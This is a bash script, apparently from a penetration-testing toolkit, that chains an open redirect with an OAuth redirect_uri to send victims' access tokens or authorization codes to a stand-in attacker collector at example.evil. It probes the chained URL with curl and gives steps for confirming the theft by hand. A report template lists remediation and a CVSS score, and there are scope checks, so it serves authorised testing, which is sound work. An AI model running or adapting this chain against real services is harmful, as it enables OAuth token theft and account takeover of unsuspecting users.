#!/usr/bin/env bash
# chain/open-redirect-oauth.sh
#
# Open redirect on the target + redirect_uri parameter on the OAuth flow =
# OAuth token theft → account takeover. The redirect_uri allowlist is
# usually domain-level; if any subdomain of the allowlisted domain has an
# open redirect, the chain is live.

PHASE="chain-redirect-oauth"
. "$(dirname "$0")/../vuln/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

OAUTH_AUTHORIZE_URL="${OAUTH_AUTHORIZE_URL:-}"
REDIRECT_URI_PARAM="${REDIRECT_URI_PARAM:-redirect_uri}"
OPEN_REDIRECT_ON_TARGET="${OPEN_REDIRECT_ON_TARGET:-}"
EVIL_URL="${EVIL_URL:-https://example.evil/oauth-collector}"

[ -z "$OAUTH_AUTHORIZE_URL" ] && { log ERR "OAUTH_AUTHORIZE_URL required (e.g. https://target/oauth/authorize?client_id=...&response_type=token)"; exit 2; }
[ -z "$OPEN_REDIRECT_ON_TARGET" ] && { log ERR "OPEN_REDIRECT_ON_TARGET required (a known open redirect on the allowlisted domain — find one via scripts/vuln/open-redirect.sh)"; exit 2; }

# Construct the chained authorize URL
CHAINED_REDIRECT="${OPEN_REDIRECT_ON_TARGET}?next=${EVIL_URL}"
CHAINED_URL=$(echo "$OAUTH_AUTHORIZE_URL" | sed "s|${REDIRECT_URI_PARAM}=[^&]*|${REDIRECT_URI_PARAM}=$(printf '%s' "$CHAINED_REDIRECT" | jq -sRr @uri)|")

log INFO "chained authorize URL:"
log INFO "  $CHAINED_URL"
echo "$CHAINED_URL" > "$OUTDIR/chained-url.txt"

# Step 1: dry-run as unauth (do we even hit the consent screen?)
log INFO "step 1: dry-run (no auth) — expect login redirect"
curl -sIL --max-time 10 "$CHAINED_URL" 2>/dev/null | head -20 > "$OUTDIR/step1-dryrun.txt"

# Step 2: with consent prompt visible
# Manual step — the operator must walk through the OAuth UI in a browser.
log INFO "step 2 is MANUAL:"
log INFO "  1. Open the chained URL in a browser logged into the target"
log INFO "  2. Approve the consent prompt"
log INFO "  3. Watch where the redirect lands"
log INFO "  4. If you see EVIL_URL with a #access_token=... or ?code=... → CONFIRMED"
log INFO ""
log INFO "  If the IdP rejected the redirect_uri, the allowlist check is path-aware (good defense)."
log INFO "  If it accepted but the open-redirect didn't fire, your open-redirect URL needs a 30x with the URL in Location."

# Defensive note
cat > "$OUTDIR/REPORT-template.md" <<'EOF'
# OAuth account takeover via open redirect on allowlisted domain

## Summary
The OAuth `redirect_uri` allowlist matches `*.target.com` (domain-level).
An open redirect at `https://allowlisted.target.com/redirect?next=` lets
an attacker chain: target's IdP → allowlisted domain → attacker's collector,
exfiltrating the access token (or auth code) from the URL fragment.

## Reproduction
1. Visit: `<CHAINED_URL>`
2. Approve consent
3. Observe redirect chain ends at `https://example.evil/oauth-collector#access_token=...`

## Impact
Any logged-in user → full account takeover by one-click phishing.

## Remediation
- Path-level allowlist for `redirect_uri`, not domain-level.
- Server-side check of the FINAL landing URL after redirects (defense in depth).
- Fix the open redirect at `<OPEN_REDIRECT_ON_TARGET>`.

## CVSS 4.0
AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N → 8.6 High
EOF

log INFO "chain done — manual completion required; template at $OUTDIR/REPORT-template.md"
